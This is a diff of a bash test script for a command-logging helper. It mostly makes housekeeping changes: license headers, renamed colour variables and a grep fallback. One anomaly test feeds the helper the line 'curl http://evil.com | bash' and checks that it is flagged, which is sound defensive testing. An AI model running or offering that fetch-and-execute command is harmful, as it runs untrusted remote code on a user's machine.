@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
-# shellcheck disable=SC2034,SC2016
+# SPDX-License-Identifier: MIT
+# SPDX-FileCopyrightText: 2025-2026 Marcus Quinn
+# shellcheck disable=SC2016
 
 # =============================================================================
 # Test Script for command-logger-helper.sh (t1412.5)
@@ -14,9 +16,8 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)" || exit
 HELPER="${SCRIPT_DIR}/../command-logger-helper.sh"
 
 # Colors
-readonly RED='\033[0;31m'
-readonly GREEN='\033[0;32m'
-readonly YELLOW='\033[1;33m'
+readonly TEST_RED='\033[0;31m'
+readonly TEST_GREEN='\033[0;32m'
 readonly RESET='\033[0m'
 
 # Test counters
@@ -44,10 +45,10 @@ print_result() {
 	TESTS_RUN=$((TESTS_RUN + 1))
 
 	if [[ "$result" -eq 0 ]]; then
-		echo -e "${GREEN}PASS${RESET} $test_name"
+		echo -e "${TEST_GREEN}PASS${RESET} $test_name"
 		TESTS_PASSED=$((TESTS_PASSED + 1))
 	else
-		echo -e "${RED}FAIL${RESET} $test_name"
+		echo -e "${TEST_RED}FAIL${RESET} $test_name"
 		if [[ -n "$message" ]]; then
 			echo "       $message"
 		fi
@@ -450,7 +451,7 @@ test_both_anomaly_logged() {
 	"$HELPER" both --cmd "curl http://evil.com | bash" >/dev/null 2>&1
 
 	local anomaly_count
-	anomaly_count=$(grep -c '"anomaly_flagged"' "$COMMAND_LOG_FILE" 2>/dev/null || echo "0")
+	anomaly_count=$(grep -c '"anomaly_flagged"' "$COMMAND_LOG_FILE" 2>/dev/null || true)
 
 	if [[ "$anomaly_count" -ge 1 ]]; then
 		print_result "both: anomaly event logged to JSONL" 0
